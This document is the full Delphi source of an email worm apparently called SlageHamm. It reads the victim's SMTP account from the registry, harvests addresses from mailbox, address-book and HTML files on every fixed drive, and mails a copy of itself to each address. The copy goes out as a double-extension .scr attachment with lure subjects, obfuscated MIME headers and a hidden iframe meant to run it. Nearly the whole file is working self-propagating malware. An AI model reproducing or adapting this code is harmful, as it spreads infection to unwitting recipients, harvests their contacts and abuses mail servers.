   program SlageHamm;
   {$APPTYPE CONSOLE}
   uses
     Winsock,
     Windows,
     SysUtils;

   Var
     WsaData :TWSAData;
     Sock    :TSocket;
     Sin     :TSockAddrIn;
     Buf     :Array [0..255] Of Char;
     FileBuf    : Array [1..100000] Of Byte;
     F: File;
     Emailler:AnsiString;
     MailServer:String;
     MailServerIp:String;
     MailAccount:String;
     MailUser:String;

   Const
     Code64       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=*-/][.,><? !~@#$%^&';
     CrLf =#13+#10;

     Extensions1 : ARRAY [1..14] OF pChar = (
       'doc',
       'mp3',
       'xls',
       'wav',
       'txt',
       'jpg',
       'gif',
       'dat',
       'bmp',
       'htm',
       'mpg',
       'mdb',
       'zip',
       '');

     Extensions2 : ARRAY [1..4] OF pChar = (
       'pif',
       'bat',
       'scr',
       'exe');

     Bodys : ARRAY [1..9] OF pChar = (
       'Check the attachment!',
       'See the attachement!',
       'Enjoy the attachement!',
       'More details attached!',
       'Hi'+CRLF+CRLF+'Check the Attachement ..'+CRLF+CRLF+'See u',
       'Hi'+CRLF+CRLF+'Check the Attachement ..',
       'Hi ,'+CrLf+' I finally can find time to send you the pictures that you wanted from me..'+CrLf+'Check The Attachment.. !',
       'Attached one Gift for u..',
       'WOW CHECK THIS!');

     Attachments : ARRAY [1..61] OF pChar = (
       'screensaver',
       'screensaver4u',
       'screensaver4u',
       'screensaverforu',
       'freescreensaver',
       'love',
       'lovers',
       'lovescr',
       'loverscreensaver',
       'loversgang',
       'loveshore',
       'love4u',
       'lovers',
       'enjoylove',
       'sharelove',
       'shareit',
       'checkfriends',
       'urfriend',
       'friendscircle',
       'friendship',
       'friends',
       'friendscr',
       'friends',
       'friends4u',
       'friendship4u',
       'friendshipbird',
       'friendshipforu',
       'friendsworld',
       'werfriends',
       'passion',
       'bullshitscr',
       'shakeit',
       'shakescr',
       'shakinglove',
       'shakingfriendship',
       'passionup',
       'rishtha',
       'mypictures',
       'greetings',
       'lovegreetings',
       'friendsgreetings',
       'friendsearch',
       'Melda',
       'Busra',
       'Sena',
       'Melis',
       'Naz',
       'Sebla',
       'Seda',
       'Gizay',
       'Merve',
       'Ismail',
       'Inci',
       'Nazim',
       'Kamer',
       'Fondip',
       'niklaus',
       'lovefinder',
       'truefriends',
       'truelovers',
       'fucker');

     Subjects : ARRAY[1..44] OF pChar = (
       'Greets!!',
       'Get 8 FREE issues - no risk!!',
       'Hi!',
       'Your News Alert!!',
       '$150 FREE Bonus!!',
       'Your Gift!',
       'New bonus in your cash account!',
       'Tools For Your Online Business!',
       'Daily Email Reminder!',
       'News',
       'Free Shipping!',
       'Its Easy!',
       'Warning!',
       'SCAM alert!!!',
       'Sponsors needed!',
       'New Reading',
       'CALL FOR INFORMATION!',
       '25 merchants and rising!',
       'Cows',
       'My eBay ads!',
       'Empty account!',
       'Market Update Report!',
       'Click on this!',
       'Fantastic!',
       'Wow!',
       'Bad news!!',
       'Lost & Found!',
       'New Contests!',
       'Today Only!!',
       'Get a FREE gift!',
       'Membership Confirmation',
       'Report',
       'Please Help...',
       'Stats',
       'Re: Pictures',
       'I need help about script!!!',
       'Interesting...',
       'Introduction',
       'Various!',
       'Announcement!',
       'History screen!',
       'Correction of errors!',
       'Just a reminder!',
       'Payment notices!');

   Type
     Triple     = Array[1..3] Of Byte;
     Quad        = ARRAY[1..4] Of Byte;

   function regReadString(kRoot: HKEY; sKey, sValue: String): String;
   var
     qValue: array[0..1023] of Char;
     DataSize: Integer;
     CurrentKey: HKEY;
   begin
     RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
     Datasize := 1023;
     RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
     RegCloseKey(CurrentKey);
     Result := String(qValue);
   end;

   Function Windizin:String;
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;
   Function Codeb64(Count:Byte;T:Triple) : String;
   VAR
     Q    : Quad;
     Strg : String;
   Begin
     If Count<3 Then Begin
       T[3]:=0;
       Q[4]:=64;
     End Else Q[4]:=(T[3] And $3F);
     If Count<2 Then Begin
       T[2]:=0;
       Q[3]:=64;
     End Else Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
     Q[2]:=Byte(((T[1] SHL 4) OR (t[2] SHR 4)) AND $3F);
     Q[1]:=((T[1] SHR 2) AND $3F);
     Strg:='';
     For Count:=1 To 4 Do Strg:=(Strg+Code64[(Q[Count]+1)]);
     RESULT:=Strg;
   END;

   Function BASE64(DataLength:Dword) : AnsiString;
   Var
     B      : AnsiString;
     I      : DWORD;
     Remain : DWORD;
     Trip   : Triple;
     Count  : WORD;
   Begin
     Count:=0;
     B:='';
     For I:=1 To DataLength Div 3 Do Begin
       INC(Count,4);
       Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
       Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
       Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
       B:=B+codeb64(3,Trip);
       If Count=76 Then Begin
         B:=B+CRLF;
         Count:=0;
       End;
     End;
     Remain:=DataLength-(DataLength Div 3)*3;
     If Remain>0 Then Begin
       Trip[1]:=Ord(FileBuf[DataLength-1]);
       If Remain>1 Then Trip[2]:=Ord(FileBuf[DataLength]);
       If Remain=1 Then B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
     End;
     Result:=B;
   End;
   Function IntToHex2(X:Byte) : String;
   Const
     Digits : Array [0..15] Of Char = '0123456789ABCDEF';
   Begin
     IntToHex2:=Concat(Digits[X SHR 4],Digits[X AND 15]);
   End;
   Function EncodeQuotedPrintable(S:String) : String;
   Var
     I : Word;
     J : Byte;
     D : String;
     K : String;
   Begin
     D:=S[1]+S[2];
     I:=2;
     J:=2;
     Repeat
       Inc(I);
       Inc(J);
       K:=IntToHex2(Ord(S[I]));
       If J=26 Then Begin
         D:=D+'='+CRLF;
         J:=1;
       End;
       D:=D+'='+K;
     Until I=Length(S);
     RESULT:=D;
   End;
   FUNCTION RandomLines:AnsiString;
   VAR
     A,B,E,F : BYTE;
   BEGIN
     A:=Random(10);
     FOR B:=1 TO A DO BEGIN
       E:=Random(40);
       FOR F:=1 TO E DO RESULT:=RESULT+Code64[Random(60)+1];
       RESULT:=RESULT+CRLF;
     END;
   END;
   FUNCTION PolyString(STR:STRING) : STRING;
   VAR
     I : WORD;
     L : WORD;
     K : WORD;
     T : STRING;
     O : Char;
     R : STRING;
   BEGIN
     FOR I:=1 TO Length(Str) DO BEGIN
       L:=Random(5)+1;
       IF Random(2)=0 THEN O:=UpCase(STR[I]) ELSE begin r:=LowerCase(STR[I]); o:=r[1];end;
       T:=T+O+'(';
       FOR K:=1 TO L DO T:=T+Code64[Random(82)+1];
       T:=T+')';
     END;
     RESULT:=T;
   END;
   procedure Mys(str: String);
   var
         I: Integer;
   begin
           for I:=1 to Length(str) do if send(Sock,str[I],1,0)=SOCKET_ERROR then
           exit;
   end;
   Procedure SendMail(Kime,Kimden,Server,Konu,Icerik,DosyaIsmi,DosyaYeri:String);
   Begin
   WSAStartUp(257, WSAData);
   Sock:=Socket(Af_Inet,Sock_Stream,IPProto_Ip);
   Sin.Sin_Family:=Af_Inet;
   Htons(25);
   Sin.Sin_port:=Htons(25);
   Sin.Sin_Addr.S_Addr:=Inet_Addr(Pchar(Server));
   Connect(Sock,Sin,SizeOf(Sin));
   Recv(Sock,Buf,SizeOf(Buf),0);
     Mys('HELO net.com'+#13+#10);
     Recv(Sock,Buf,Sizeof(Buf),0);
     Mys('MAIL FROM: '+Kimden+#13+#10);
     Recv(Sock,Buf,Sizeof(Buf),0);
     Mys('RCPT TO: '+Kime+#13+#10);
     Recv(Sock,Buf,SizeOf(Buf),0);
     Mys('DATA'+#13+#10);
     Recv(Sock,Buf,SizeOf(Buf),0);
     Mys(PolyString('MIME-Version: 1.0')+CRLF);
     Mys('Content-Type: '+PolyString('multipart/mixed;')+CRLF);
     Mys('    '+PolyString('boundary=')+'"bla"'+CRLF);
     Mys('Subject: '+Konu+CRLF+CRLF);
     //Mys(GetDate+CRLF);
     Mys(RandomLines+CRLF);
     Mys('--bla'+CRLF);
     Mys('Content-Type: '+PolyString('text/plain; charset:us-ascii')+CRLF+CRLF);
     Mys(Icerik+CRLF+CRLF);
     Mys('--bla'+CRLF);
     Mys('Content-Type: '+PolyString('text/html')+CRLF);
     Mys('Content-Transfer-Encoding: '+PolyString('quoted-printable')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('<HTML>')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('<HEAD>')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('</HEAD>')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('<BODY >')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('<iframe src=cid:EMAIL height=3D0 width=0></iframe>')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('</BODY>')+CRLF+CRLF);
     Mys(EncodeQuotedPrintable('</HTML>')+CRLF);
     Mys('--bla'+CRLF);
     Mys('Content-Type: '+PolyString('application/x-shockwave-flash;')+CRLF);
     Mys('    '+PolyString('name=')+'"'+DosyaIsmi+'"'+CRLF);
     Mys('Content-Transfer-Encoding: '+PolyString('base64')+CRLF);
     Mys('Content-ID: <EMAIL>'+CRLF+CRLF);

     AssignFile(F,DosyaYeri);
     IF FileExists(DosyaYeri) THEN BEGIN
       Reset(F,1);
       BlockRead(F,FileBuf[1],FileSize(F));
       Mys(BASE64(FileSize(F)));
       CloseFile(F);
     END;

     Mys(CRLF+'--bla--'+CRLF+CRLF);
     Mys(CRLF+'.'+CRLF);
     Recv(Sock,Buf,SizeOf(Buf),0);
     Mys('QUIT'+CRLF);
     Recv(Sock,Buf,SizeOf(Buf),0);
     WriteLn('Sent '+Kime);
           Closesocket(sock);
   End;
   Procedure MailAtOna(Mail,Kimden,Server:String);
   Var
   Konu,Icerik,DosyaIsmi,DosyaYeri:String;
   Begin
   Konu:=Subjects[Random(43)+1];
   Icerik:=Bodys[Random(8)+1];
   DosyaIsmi:=Attachments[Random(60)+1]+'.'+Extensions1[Random(13)+1]+'.'+Extensions2[Random(3)+1];
   DosyaYeri:=Windizin+'Melda.scr';
   SendMail(Mail,Kimden,Server,Konu,Icerik,DosyaIsmi,DosyaYeri);
   End;

   Procedure EmailEkle(Email:String);
   Begin
   If Pos('*'+Email,Emailler) = 0 Then
   Begin
   Emailler:=Emailler+'*'+Email;
   WriteLn('Sending '+Email);
   MailAtOna(Email,MailUser,MailServerIp);
   End;
   End;


   Procedure EmailTemizle(S: String);
   Var
     B : Word;
     C : String;
   Begin
     For B:=Pos('@',S)+1 TO Length(S) DO
       If ((S[B]<'a')Or(S[B]>'z'))And((S[B]<'0')Or(S[B]>'9'))And((S[B]<'A')Or(S[B]>'Z'))And(S[B]<>'.')And(S[B]<>'-')And(S[B]<>'_') Then
       Begin
         Delete(S,B,Length(S));
         Break;
       End;
       C:=Copy(S,1,1);
     If ((C>='A')And(C<='Z'))Or((C>='a')And(C<='z')) Then
     If (Pos('@',S)>0)And(Pos('?',S)=0)And(Pos('%',S)=0)And(Pos('$',S)=0)And(Pos(':',S)=0)And(Pos(' ',S)=0) Then Begin  EmailEkle(S); End;
   End;
   PROCEDURE ExtrackEmailFromDBX(FilePath:STRING);
   VAR
     BufferSize : Integer;
     I          : Integer;
     hFile      : Integer;
     Buffer     : PChar;
     StrEmail   : STRING;
     F          : FILE;
   BEGIN
     AssignFile(F,FilePath);
     {$I-}
     Reset(F,1);
     IF IOResult=0 THEN BEGIN
       BufferSize:=FileSize(F);
       CloseFile(F);
       IF BufferSize<=0 THEN Exit;
       hFile:=FileOpen(FilePath,fmOpenRead);
       TRY
         IF hFile=0 THEN Exit;
         GetMem(Buffer,BufferSize+1);
         TRY
           FileRead(hFile,Buffer^,BufferSize);
           I:=0;
           WHILE I<=BufferSize-1 DO BEGIN
             StrEmail:='';
             IF Buffer[I]='<' THEN BEGIN
               Inc(I);
                WHILE (Buffer[I]<>'@')AND(I<=BufferSize) DO BEGIN
                  IF (Buffer[I]=CHR(45))OR(Buffer[I]=CHR(46))OR(Buffer[I]=CHR(90))OR((Buffer[I]>CHR(49))AND(Buffer[I]<=CHR(57)))OR((Buffer[I]>=CHR(65))AND(Buffer[I]<=CHR(90)))OR((Buffer[I]>=CHR(97))AND(Buffer[I]<=CHR(122))) THEN BEGIN
                    StrEmail:=StrEmail+Buffer[I];
                  END ELSE BEGIN
                    StrEmail:='';
                    Break;
                  END;
                  Inc(I);
                END;
                IF StrEmail<>'' THEN BEGIN
                  StrEmail:=StrEmail+'@';
                  Inc(I);
                  WHILE(Buffer[I]<>'.')AND(I<=BufferSize) DO BEGIN
                    IF(Buffer[I]=CHR(45))OR(Buffer[I]=CHR(46))OR(Buffer[I]=CHR(90))OR((Buffer[I]>=CHR(49))AND(Buffer[I]<=CHR(57)))OR((Buffer[I]>=CHR(65))AND(Buffer[I]<=CHR(90)))OR((Buffer[I]>=CHR(97))AND(Buffer[I]<=CHR(122))) THEN BEGIN
                      StrEmail:=StrEmail+Buffer[I];
                    END ELSE BEGIN
                      StrEmail:='';
                      Break;
                    END;
                    Inc(I);
                  END;
                  IF StrEmail<>'' THEN BEGIN
                     StrEmail:=StrEmail+'.';
                     Inc(i);
                     WHILE (Buffer[I]<>'>')AND(I<=BufferSize) DO BEGIN
                       IF (Buffer[I]=CHR(45))OR(Buffer[I]=CHR(46))OR(Buffer[I]=CHR(90))OR((Buffer[I]>=CHR(49))AND(Buffer[I]<=CHR(57)))OR((Buffer[I]>=CHR(65))AND(Buffer[I]<=CHR(90)))OR((Buffer[I]>=CHR(97))AND(Buffer[I]<=CHR(122))) THEN BEGIN
                       StrEmail:=StrEmail+Buffer[I];
                     END ELSE BEGIN
                       StrEmail:='';
                      Break;
                     END;
                     Inc(I);
                   END;
                   IF StrEmail<>'' THEN BEGIN
                     EMailTemizle(StrEmail);
                     Inc(I);
                   END;
                 END;
               END;
             END ELSE Inc(I);
           END;
           FINALLY
             FreeMem(Buffer);
           END;
         FINALLY
           FileClose(hFile);
         END;
       END;
      {$I+}
     END;

   PROCEDURE MailAra(EFile:AnsiString);
   VAR
     F   : Text;
     E,D : WORD;
   BEGIN
     IF FileExists(EFile) THEN BEGIN
       Assign(F,EFile);
       Reset(F);
       REPEAT
         ReadLn(F,EFile);
         EFile:=UpperCase(EFile);
         E:=Pos('LTO:',EFile);
         IF E>0 THEN BEGIN
           Delete(EFile,1,E+3);
           D:=Pos('"',EFile);
           IF D>0 THEN Delete(EFile,D,Length(EFile));
           EMailTemizle(EFile);
         END;
       UNTIL EOF(F);
       Close(F);
     END;
   END;
   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
   LABEL
     Abort, Close;
   VAR
     F : TextFile;
     S : STRING;
     T : STRING;
     G : STRING;
     K : STRING;
     A : Byte;
     B : Byte;
     C : Byte;
     H : Byte;
     Y : Byte;
   BEGIN

     AssignFile(F,FileName);
     {$I-}
     Reset(F);
     IF IOResult<>0 THEN GOTO Abort;
     REPEAT
       ReadLn(F,S);
       IF IOResult<>0 THEN GOTO Close;
       FOR C:=0 TO 3 DO BEGIN
         IF C=0 THEN K:='To: ';
         IF C=1 THEN K:='From: ';
         IF C=2 THEN K:='cc: ';
         IF C=3 THEN K:='Cc: ';
         IF Pos(K,S)=1 THEN BEGIN
           IF C=1 THEN Y:=2 ELSE Y:=0;
           Delete(S,1,Pos(K,S)+3+Y);
           IF Pos('<',S)>0 THEN BEGIN
             H:=0;
             REPEAT
               IF H=1 THEN BEGIN
                H:=0;
                 Readln(F,S);
                 IF IOResult<>0 THEN GOTO Close;
               END;
               REPEAT
                 A:=Pos('<',S);
                 B:=Pos('>',S);
                 T:=Copy(S,A+1,B-A-1);
                 IF Pos('@',T)>0 THEN EmailTemizle(T);
                Delete(S,1,B);
               UNTIL Pos('<',S)=0;
               IF Pos(',',S)>0 THEN H:=1;
             UNTIL H=0;
           END ELSE IF Pos('@',S)>0 THEN BEGIN
             IF (C<>1) THEN BEGIN
               G:=S;
               WHILE G[Length(G)]=',' DO BEGIN
                 Readln(F,G);
                 IF IOResult<>0 THEN GOTO Close;
                 S:=S+G;
               END;
               REPEAT
                 A:=0;
                 REPEAT
                   INC(A);
                 UNTIL S[A]<>' ';
                 G:=Copy(S,A,Pos(',',S)-A);
                 Delete(S,1,Pos(',',S));
                 IF Pos(' ',G)>0 THEN SetLength(G,Pos(' ',G));
                 IF(G<>'')AND(Pos('@',G)>0) THEN EmailTemizle(G)
               UNTIL Pos(',',S)=0;
               A:=0;
               REPEAT
                 INC(A);
               UNTIL S[A]<>' ';
               Delete(s,1,a-1);
               IF Pos(' ',S)>0 THEN SetLength(S,Pos(' ',S));
               IF Pos('@',S)>0 THEN EmailTemizle(S)
             END;
           END;
         END;
       END;
     UNTIL EOF(F);
     Close:
     CloseFile(F);
     Abort:
     {$I+}
   END;
   PROCEDURE ReadWAB(FileName:STRING);
   VAR
     F       : FILE;
     I       : DWORD;
     S       : STRING;
     N       : ARRAY[1..5] OF Char;
     Buf     : ARRAY[1..500] OF Char;
   BEGIN
     AssignFile(F,FileName);
     IF(FileName<>'')AND(FileExists(FileName)) THEN BEGIN
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         REPEAT
           BlockRead(F,N,2);
           IF N[1]+N[2]=#03#48 THEN BEGIN
             BlockRead(F,Buf,Ord(N[2])+30);
             S:='';
             FOR I:=1 TO Ord(N[2])+30 DO S:=S+Buf[I];
             Delete(S,1,3);
             I:=Pos(#00#00#00,S);
             IF I>0 THEN SetLength(S,I-1);
             FOR I:=1 TO Ord(N[2]) DO IF S[I]=#00 THEN Delete(S,I,1);
             FOR I:=1 TO Length(S) DO
               IF S[I]<chr(45) THEN BEGIN
                 SetLength(S,I-1);
                 Break;
               END;
            IF (Pos('@',S)>0)AND(Pos('.',S)>0) THEN EmailTemizle(S);
           END ELSE Seek(F,FilePos(F)-1);
         UNTIL FileSize(F)-FilePos(F)<6;
         CloseFile(F);
       END;
       {$I+}
     END;
   END;

   PROCEDURE SearchAllDirs(Path,fSpec:AnsiString);
   VAR
     D     : TSearchRec;
     Error : integer;
     I:Byte;
       S     : STRING;
   BEGIN
     Error:=FindFirst(Path+'*.dbx',faAnyFile OR faHidden,D);             //"dbx"
     WHILE Error=0 DO BEGIN
       ExtrackEmailFromDBX(Path+D.Name);
       Error:=FindNext(D);
     END;
   //
     FOR I:=1 TO 5 DO BEGIN
       CASE I OF
         1 : S:='mbx';                                                      //"mbx"
         2 : S:='tbb';                                                      //"tbb"
         3 : S:='eml';                                                      //"eml"
         4 : S:='mai';                                                      //"mai"
         5 : S:='mbox';                                                      //"mbox"
       END;
       Error:=FindFirst(Path+'*.'+S,faAnyFile OR faHidden,D);
       WHILE Error=0 DO BEGIN
         GetEmailsFromMBX_TBB(Path+D.Name);
         Error:=FindNext(D);
       END;
     END;
   //
     Error:=FindFirst(Path+'*.wab',faAnyFile OR faHidden,D);             //"wab"
     WHILE Error=0 DO BEGIN
       ReadWAB(Path+D.Name);
       Error:=FindNext(D);
     END;
   //
     Error:=FindFirst(Path+fSpec,faAnyFile,D);
     WHILE Error=0 DO BEGIN
       MailAra(Path+D.Name);
       Error:=FindNext(D);
     END;
     Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
     WHILE Error=0 DO BEGIN
       IF (D.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path+D.Name+'\',fSpec);
       Error:=FindNext(D);
     END;
   END;
   FUNCTION NameToIP(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;


   PROCEDURE SearchAllDir;
   VAR
     I : BYTE;
   BEGIN
     FOR I:=ord('c') TO ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm*');
   END;

   begin
   MailAccount:=RegReadString(HKEY_CURRENT_USER,
    'Software\Microsoft\Internet Account Manager',
    'Default Mail Account');
   If MailAccount<>'' Then
   Begin
   MailServer:=RegReadString(HKEY_CURRENT_USER,
    'Software\Microsoft\Internet Account Manager\Accounts\'+MailAccount,
    'SMTP Server');
   MailServerIp:=NameToIP(MailServer);
   MailUser:=RegReadString(HKEY_CURRENT_USER,
    'Software\Microsoft\Internet Account Manager\Accounts\'+MailAccount,
    'SMTP Email Address');
   If (MailServerIp='') Or (MailUser='') Then
    Begin
    MailServer:='194.67.23.10';
    MailUser:='victor@mail.ru';
    End;
   End
   Else
   Begin
   MailServer:='194.67.23.10';
   MailUser:='victor@mail.ru';
   End;
     WriteLn('Mail Sending Program By nikLaus');
     WriteLn('Greetings :');
     WriteLn('ChatLAcK!!');
     WriteLn('MailServer: '+MailServer);
     WriteLn('MailServerIp : '+MailServerIp);
     WriteLn('MailUser: '+MailUser);
     SearchAllDir;
   end.
